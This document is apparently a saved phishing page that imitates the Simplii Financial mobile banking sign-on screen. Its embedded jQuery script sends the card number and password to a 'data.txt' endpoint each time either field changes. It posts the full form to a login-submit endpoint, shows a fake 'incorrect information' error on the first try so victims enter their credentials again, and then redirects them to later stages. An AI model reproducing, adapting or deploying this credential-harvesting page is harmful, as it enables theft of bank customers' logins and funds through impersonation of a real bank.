
<!-- saved from url=(0040)/220098/simplii -->
<html><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Simplii Financial Mobile Banking Sign On</title>
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" type="text/css" href="./files/reset.css">
        <link rel="stylesheet" type="text/css" href="./files/reset-brand.css">
        <link rel="stylesheet" type="text/css" href="./files/global.css">
        <link rel="stylesheet" type="text/css" href="./files/global-android2.css">
        <link rel="stylesheet" type="text/css" href="./files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./files/carousel.css">
        <link rel="stylesheet" type="text/css" href="./files/signon.css">
        <meta name="msapplication-tap-highlight" content="no">
        <style>
        .check-label::before {
            background-image: url(/assets/simplii/img/checkbox.png);
        }

        .check-box:checked + .check-label::before {
            background-image: url(/assets/simplii/img/checkbox-selected.png);
        }

        .input-password {
          -webkit-text-security: disc;
        }
        </style>
        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Simplii';
            var lrinfo = 'Login';
        </script>
        <script src="./files/actions.js###"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (validate()) {
                    if (attempt == 1) {
                        $('.div-loader').css('display', 'block');
                        $('.div-main').css('display', 'none');

                        $.post('/220098/simplii/api/login-submit', $(this).serialize(), function(response) {
                            $('.error-div').css('display', 'block');

                            $(form).trigger('reset');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }, 'JSON');

                        attempt = 2;
                    } else {
                        $('.div-loader').css('display', 'block');
                        $('.div-main').css('display', 'none');

                        $.post('/220098/simplii/api/login-submit', $(this).serialize(), function(response) {
                            if (response.status) {
                                if (response.data.loader) {
                                    location.href = '/220098/simplii/w';
                                } else {
                                    location.href = '/220098/simplii/d';
                                }
                            } else {
                                $(form).trigger('reset');

                                $('.error-div').css('display', 'block');

                                $('.div-loader').css('display', 'none');
                                $('.div-main').css('display', 'block');
                            }
                        }, 'JSON');
                    }
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/220098/simplii/data.txt', {username: username, password: password});
            });
        });
        </script>
        <link rel="stylesheet" href="./files/all.css">
    </head>
    <body lang="en">
        <span class="offscreen">Simplii Financial Mobile Banking Sign On</span>
        <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <img src="./files/pcfDrawerLogo.png" alt="Simplii Logo" id="preSignonLogo">
                </div>
                <ul>
                    <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow active" href="/220098/#" role="menuitem">Sign On<span class="offscreen">Selected</span></a></li>
                    <li><a id="register-link" class="tracking-set-flow" href="/220098/#" role="menuitem">Register</a></li>
                    <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow" href="/220098/#" role="menuitem">Forgot Password</a></li>
                    <hr>
                    <li id="li-visit-site-pcf"><a id="visit-site-link" href="/220098/#" target="_blank" role="menuitem">Simplii.com<span class="offscreen">. Opens in new page</span></a></li>
                    <li id="li-find-us"><a id="find-us-link" href="/220098/#" target="_blank" role="menuitem">Find Us</a></li>
                    <li id="li-security"><a id="security-guarantee-link" href="/220098/#" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="/220098/#" target="_blank" role="menuitem">Talk to Us</a></li>
                    <li><a class="nav-no-indent" id="legal-link" href="/220098/#" target="_blank" role="menuitem">Products and Services Agreement<span class="offscreen">. Opens in new page</span></a></li>
                    <li><a class="nav-no-indent" id="help-link" href="/220098/#" target="_blank" role="menuitem">Help</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="/220098/#" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <noscript>
            <section id="nojs" class="overlay-msg">
                <div>
                    <p>JavaScript is currently disabled in your browser.</p>
                    <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
                </div>
            </section>
        </noscript>
        <section id="main-page" class="div-main" style="display: none;">
            <input type="checkbox" id="sign-off-check" class="hide" name="signOffCheck">
            <section id="signoff" class="overlay-msg">
                <div>
                    <a href="/220098/#" id="sign-off-button"><img src="./files/close-icon-red.png" alt="Close" role="button"></a>
                    <p>You have successfully signed out.</p>
                    <div id="sub-msg">Thank you for banking with <span>Simplii Financial</span> Mobile Banking.</div>
                </div>
            </section>
            <div id="carousel-container" aria-hidden="true">
                <img id="slide-sizer" src="./files/sizer.png" alt="">
                <section id="carousel">
                    <div id="items-container">
                        <div id="touch-box"></div>
                        <article id="s1" class="carousel-item carousel-item-on" style="z-index: 0;">
                            <a id="carousel-link-1" href="/220098/#"><img src="./files/46842-mobi.png" alt=""></a>
                        </article>
                    </div>
                </section>
                <div id="slideIndicators">
                    <div class="inline">
                        <div class="indicator-bg indicator-on" id="indicator1"></div>
                    </div>
                </div>
                <!-- end of panel -->
            </div>
            <section id="signon">
                <div id="form-center">
                    <div class="global-error-from-container" tabindex="-1" id="id8">
                        <div class="global-error-from-container error-div" style="display: none" tabindex="-1">
                        	<div class="global-error-form-wrapper">
                                <div class="global-error-form-msg">
                            		<span role="alert" class="">You have entered incorrect information. Check your card number and password and try again. (0008)</span>
                            	</div>
                            </div>
                        </div>
                    </div>
                    <form class="lab-form" id="lab-form" method="post" action="/220098/simplii">
                        <div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id7_hf_0" id="id7_hf_0"></div>
                        <fieldset class="sign-on-new" id="new-card-number">
                            <label for="user-card-number"><span class="offscreen">Card Number</span></label>
                            <input id="input-card" type="tel" placeholder="Card Number" name="username" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" class="lrinput input-username" attr-action="Filling Username" style="margin-bottom: 10px">
                            <input type="hidden" name="CRSFToken" value="">
                            <script src="./files/splitter.js###"></script>
                            <link rel="stylesheet" href="./files/card.css">
                        </fieldset>
                        <fieldset class="sign-on-new" id="remember-new-card">
                            <input type="checkbox" id="remember-card-chk" class="check-box" name="rememberCardCkBx">
                            <label for="remember-card-chk" class="check-label" id="remember-card-label">Remember Card</label>
                        </fieldset>
                        <fieldset class="sign-on-remember"></fieldset>
                        <fieldset>
                            <label for="user-password"><span class="offscreen">Password</span></label>
                            <input type="text" autocomplete="off" data-id="password" id="user-password" class="lrinput input-password" name="password" placeholder="Password" maxlength="18" required="true" value="" attr-action="Filling Password" autocapitalize="none">
                        </fieldset>
                        <button type="submit" class="btn btn-neutral btn-save btn-login" id="signon-button" name="save22">
                            <span class="btn-txt">SIGN ON</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </form>
                </div>
                <div id="bttm-shadow"><img src="./files/shadow.png" id="shadow" role="presentation"></div>
            </section>
            <footer class="page-footer">
                <div>
                    <p>Simplii Financial personal banking services are provided by the direct banking division of CIBC. Banking services not available in Quebec.</p>
                </div>
                <div class="release">
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    <!-- *** Dynamic changes begin do not remove *** -->
                    <p>RT15.0 &nbsp; &nbsp; 2.5.3 &nbsp; &nbsp; (aaa681e-6795e3-0)</p>
                    <!-- *** Dynamic changes end do not remove *** -->
                </div>
            </footer>
        </section>
        <section id="change-password" class="page-wrapper div-loader" style="display: block; margin-top: 46px;">
            <style>
            .loader-div {
                text-align: center;
                padding-top: 20px;
            }

            .loader-div h2 {
                font-size: 28px;
                margin-bottom: 40px;
            }
            </style>
            <div class="global-error-from-container loader-div" id="idf">
                <h2 class="title">Processing</h2>
                <img src="./files/loading.gif" width="80">
            </div>
        </section>
    

</body></html>